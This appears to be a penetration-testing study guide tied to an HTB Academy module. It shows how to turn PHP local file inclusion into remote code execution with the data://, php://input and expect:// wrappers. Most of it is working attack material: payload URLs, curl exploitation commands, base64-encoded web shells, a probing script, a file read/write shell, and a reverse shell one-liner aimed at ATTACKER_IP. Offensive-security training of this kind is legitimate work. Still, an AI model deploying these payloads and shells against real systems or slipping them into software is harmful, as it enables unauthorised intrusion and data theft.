# PHP Wrappers for RCE - HTB Academy Guide

## Remote Code Execution via PHP Wrappers

PHP wrappers enable attackers to achieve Remote Code Execution (RCE) through LFI vulnerabilities when include functions have execute privileges. This section covers the most effective wrapper-based RCE techniques.

### Prerequisites for PHP Wrapper RCE

**Required Conditions:**
- LFI vulnerability in PHP application
- Include function with execute privileges
- Specific PHP configuration settings (varies by wrapper)

**Vulnerable Functions Supporting RCE:**
| Function | Read Content | Execute | Remote URL |
|----------|-------------|---------|------------|
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |

---

## Method 1: Data Wrapper RCE

The `data://` wrapper allows embedding PHP code directly in the URL, providing an immediate RCE vector.

### Basic Data Wrapper Syntax

**Configuration Requirements:**
```ini
# Required in php.ini
allow_url_include = On
```

**Basic Syntax:**
```bash
data://text/plain,PHP_CODE_HERE
data://text/plain;base64,BASE64_ENCODED_PHP
```

### Data Wrapper Examples

**Simple Command Execution:**
```bash
# Direct PHP code execution
http://target.com/index.php?page=data://text/plain,<?php system('id'); ?>

# URL encoded version
http://target.com/index.php?page=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
```

**Base64 Encoded PHP:**
```bash
# Create base64 payload
echo '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Use in data wrapper
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=whoami
```

### HTB Academy Data Wrapper Lab

**Target Configuration:**
- **Lab Environment:** HTB Academy platform
- **Objective:** Achieve RCE using data wrapper

**Step-by-Step Solution:**
```bash
# Step 1: Verify LFI vulnerability
http://target.com/index.php?language=../../../../etc/passwd

# Step 2: Check if allow_url_include is enabled
http://target.com/index.php?language=data://text/plain,<?php phpinfo(); ?>
# Look for allow_url_include = On

# Step 3: Test basic RCE
http://target.com/index.php?language=data://text/plain,<?php system('id'); ?>

# Step 4: Create web shell
http://target.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=ls -la

# Step 5: Execute commands and find flags
http://target.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=find / -name "*flag*" 2>/dev/null
```

---

## Method 2: Input Wrapper RCE

The `php://input` wrapper reads raw POST data, allowing PHP code execution through POST requests.

### Input Wrapper Configuration

**Configuration Requirements:**
```ini
# Required in php.ini
allow_url_include = On
```

**Basic Usage:**
```bash
# Wrapper syntax
php://input

# PHP code sent via POST data
```

### Input Wrapper Examples

**Basic POST RCE:**
```bash
# Send PHP code via POST data
curl -X POST --data '<?php system("id"); ?>' "http://target.com/index.php?page=php://input"

# Web shell via POST
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index.php?page=php://input&cmd=whoami"
```

**Advanced Input Wrapper Usage:**
```bash
# Multi-line PHP script
curl -X POST --data '<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>' "http://target.com/index.php?page=php://input&cmd=ls -la"
```

### HTB Academy Input Wrapper Lab

**Complete Exploitation Process:**
```bash
# Step 1: Test LFI vulnerability
curl "http://target.com/index.php?language=../../../../etc/passwd"

# Step 2: Verify php://input support
curl -X POST --data '<?php echo "PHP Input Works!"; ?>' "http://target.com/index.php?language=php://input"

# Step 3: Execute system commands
curl -X POST --data '<?php system("id"); ?>' "http://target.com/index.php?language=php://input"

# Step 4: Create interactive web shell
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index.php?language=php://input&cmd=uname -a"

# Step 5: Escalate and find flags
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index.php?language=php://input&cmd=find / -name flag.txt 2>/dev/null"
```

---

## Method 3: Expect Wrapper RCE

The `expect://` wrapper provides direct command execution without requiring PHP code.

### Expect Wrapper Configuration

**Configuration Requirements:**
```ini
# Required PHP extension
extension=expect

# Usually disabled by default
```

**Basic Usage:**
```bash
# Direct command execution
expect://id
expect://whoami
expect://ls -la
```

### Expect Wrapper Examples

**Basic Command Execution:**
```bash
# Simple commands
http://target.com/index.php?page=expect://id
http://target.com/index.php?page=expect://whoami
http://target.com/index.php?page=expect://uname -a

# File system operations
http://target.com/index.php?page=expect://ls -la /
http://target.com/index.php?page=expect://cat /etc/passwd
```

**Advanced Expect Usage:**
```bash
# Complex commands with pipes
http://target.com/index.php?page=expect://ps aux | grep apache

# Command chaining
http://target.com/index.php?page=expect://whoami && id && pwd

# Reverse shell (if available)
http://target.com/index.php?page=expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

### HTB Academy Expect Wrapper Lab

**Testing Process:**
```bash
# Step 1: Test for expect extension
http://target.com/index.php?language=expect://id

# If successful, expect is available
# Step 2: System enumeration
http://target.com/index.php?language=expect://uname -a
http://target.com/index.php?language=expect://ls -la /

# Step 3: User enumeration
http://target.com/index.php?language=expect://whoami
http://target.com/index.php?language=expect://cat /etc/passwd

# Step 4: Flag hunting
http://target.com/index.php?language=expect://find / -name "*flag*" -type f 2>/dev/null
http://target.com/index.php?language=expect://cat /path/to/flag.txt
```

---

## PHP Configuration Verification

### Checking allow_url_include

**Method 1: phpinfo() via Data Wrapper**
```bash
# Check PHP configuration
http://target.com/index.php?page=data://text/plain,<?php phpinfo(); ?>

# Look for: allow_url_include = On
```

**Method 2: Direct Configuration Check**
```bash
# Read php.ini via LFI
http://target.com/index.php?page=../../../../etc/php/*/apache2/php.ini

# Search for allow_url_include setting
curl -s "http://target.com/lfi.php?file=../../../../etc/php/7.4/apache2/php.ini" | grep allow_url_include
```

**Method 3: ini_get() Function**
```bash
# Check specific setting
http://target.com/index.php?page=data://text/plain,<?php echo ini_get('allow_url_include') ? 'Enabled' : 'Disabled'; ?>
```

### Testing Wrapper Support

**Comprehensive Wrapper Testing:**
```bash
# Test data wrapper
curl "http://target.com/lfi.php?file=data://text/plain,<?php echo 'Data wrapper works!'; ?>"

# Test input wrapper  
curl -X POST --data '<?php echo "Input wrapper works!"; ?>' "http://target.com/lfi.php?file=php://input"

# Test expect wrapper
curl "http://target.com/lfi.php?file=expect://echo 'Expect wrapper works!'"

# Test filter wrapper (always available)
curl "http://target.com/lfi.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

---

## Wrapper RCE Troubleshooting

### Problem: Data wrapper not working
```bash
# Issue: allow_url_include disabled
# Check 1: Verify configuration
http://target.com/lfi.php?file=data://text/plain,<?php echo ini_get('allow_url_include'); ?>

# Check 2: Try different encoding
# URL encode the payload
data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E

# Check 3: Try base64 encoding
echo '<?php system("id"); ?>' | base64
data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pgo=
```

### Problem: Input wrapper issues
```bash
# Issue: POST data not executing
# Check 1: Verify POST method
curl -X POST -v --data '<?php echo "test"; ?>' "URL"

# Check 2: Check Content-Type
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data '<?php echo "test"; ?>' "URL"

# Check 3: Try different POST data formats
curl -X POST --data-raw '<?php echo "test"; ?>' "URL"
```

### Problem: Expect wrapper not available
```bash
# Issue: Expect extension not installed
# Check 1: Verify through phpinfo
http://target.com/lfi.php?file=data://text/plain,<?php phpinfo(); ?>
# Look for expect extension

# Check 2: Check loaded extensions
http://target.com/lfi.php?file=data://text/plain,<?php print_r(get_loaded_extensions()); ?>

# Check 3: Try alternative methods
# Use data or input wrappers instead
```

### Problem: PHP code not executing
```bash
# Issue: Include function has no execute privileges
# Check 1: Test with simple echo
http://target.com/lfi.php?file=data://text/plain,<?php echo "Hello World"; ?>

# Check 2: Check function restrictions
http://target.com/lfi.php?file=data://text/plain,<?php echo ini_get('disable_functions'); ?>

# Check 3: Try different functions
system() exec() shell_exec() passthru() popen() proc_open()
```

---

## Tools and Resources

### RCE Testing Scripts

**Automated Wrapper Testing:**
```bash
cat << 'EOF' > test_php_wrappers.sh
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url_with_lfi_param>"
    echo "Example: $0 'http://target.com/lfi.php?file='"
    exit 1
fi

echo "[+] Testing PHP wrapper support..."

# Test data wrapper
echo -n "Data wrapper: "
result=$(curl -s "${TARGET}data://text/plain,<?php echo 'WORKING'; ?>" | grep -o "WORKING" | wc -l)
[ "$result" -gt 0 ] && echo "✓ Available" || echo "✗ Not available"

# Test input wrapper
echo -n "Input wrapper: "
result=$(curl -s -X POST --data '<?php echo "WORKING"; ?>' "${TARGET}php://input" | grep -o "WORKING" | wc -l)
[ "$result" -gt 0 ] && echo "✓ Available" || echo "✗ Not available"

# Test expect wrapper
echo -n "Expect wrapper: "
result=$(curl -s "${TARGET}expect://echo WORKING" | grep -o "WORKING" | wc -l)
[ "$result" -gt 0 ] && echo "✓ Available" || echo "✗ Not available"

echo "[+] Testing complete."
EOF
chmod +x test_php_wrappers.sh
```

### Payload Generation Tools

**Base64 PHP Payload Generator:**
```bash
# PHP payload encoder
encode_php_payload() {
    local payload="$1"
    echo -n "$payload" | base64 | tr -d '\n'
}

# Usage examples
encode_php_payload '<?php system($_GET["cmd"]); ?>'
encode_php_payload '<?php echo shell_exec($_GET["cmd"]); ?>'
```

**URL Encoding Helper:**
```bash
# URL encode PHP payloads
url_encode_payload() {
    echo "$1" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
}

# Usage
url_encode_payload '<?php system("id"); ?>'
```

### Common PHP RCE Payloads

**Web Shell Payloads:**
```php
// Basic command execution
<?php system($_GET["cmd"]); ?>

// Enhanced web shell
<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    echo shell_exec($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "Usage: ?cmd=command";
}
?>

// File operations
<?php
if(isset($_GET["action"])) {
    switch($_GET["action"]) {
        case "read":
            echo file_get_contents($_GET["file"]);
            break;
        case "write":
            file_put_contents($_GET["file"], $_GET["content"]);
            break;
        case "exec":
            system($_GET["cmd"]);
            break;
    }
}
?>
```

**Base64 Encoded Payloads:**
```bash
# Basic command execution
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# File read/write shell
echo '<?php if($_GET["a"]=="r") echo file_get_contents($_GET["f"]); if($_GET["a"]=="w") file_put_contents($_GET["f"],$_GET["c"]); ?>' | base64
# PD9waHAgaWYoJF9HRVRbImEiXT09InIiKSBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRfR0VUWyJmIl0pOyBpZigkX0dFVFsiYSJdPT0idyIpIGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWyJmIl0sJF9HRVRbImMiXSk7ID8+Cg==
```

---

*This guide covers PHP wrapper techniques for achieving RCE through LFI vulnerabilities, based on HTB Academy's File Inclusion module. These methods are essential for escalating LFI to full system compromise.* 